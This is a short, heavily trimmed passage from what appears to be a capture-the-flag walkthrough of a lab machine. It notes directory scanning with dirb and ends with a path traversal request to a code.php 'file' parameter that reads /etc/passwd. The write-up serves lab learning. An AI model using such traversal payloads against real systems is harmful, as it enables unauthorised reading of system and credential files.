...
\
it has /tryharder/tryharder as an endpoint, which gives us this base64 encoded string
\
```bash
...
\
after running dirb on port 80 we find /time endpoint which just shows current time
\
...
so accessing
```bash
http://192.168.1.9/nomercy/windows/code.php?file=../../../../../../etc/passwd
```
